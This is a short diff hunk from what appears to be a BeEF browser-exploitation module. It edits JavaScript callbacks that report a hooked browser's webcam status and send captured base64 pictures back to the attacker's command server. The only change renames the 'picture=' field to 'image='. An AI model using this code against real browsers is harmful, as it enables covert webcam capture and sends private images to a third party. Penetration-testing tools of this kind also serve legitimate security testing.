@@ -22,7 +22,7 @@ beef.execute(function() {
     
     
     //These 4 function names [noCamera(), noCamera(), pressedDisallow(), pictureCallback(picture), allPicturesTaken()] are hard coded in the swf actionscript3. Flash will invoke these functions directly. The picture for the pictureCallback function will be a base64 encoded JPG string
-    var js_functions = '<script>function noCamera() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=The user has no camera"); }; function pressedAllow() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=User pressed allow, you should get pictures soon"); }; function pressedDisallow() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=User pressed disallow, you won\'t get pictures"); }; function pictureCallback(picture) { beef.net.send("<%= @command_url %>", <%= @command_id %>, "picture="+picture); }; function allPicturesTaken(){  }';
+    var js_functions = '<script>function noCamera() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=The user has no camera"); }; function pressedAllow() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=User pressed allow, you should get pictures soon"); }; function pressedDisallow() { beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=User pressed disallow, you won\'t get pictures"); }; function pictureCallback(picture) { beef.net.send("<%= @command_url %>", <%= @command_id %>, "image="+picture); }; function allPicturesTaken(){  }';
     
     //This function is called by swfobject, if if fails to add the flash file to the page
     
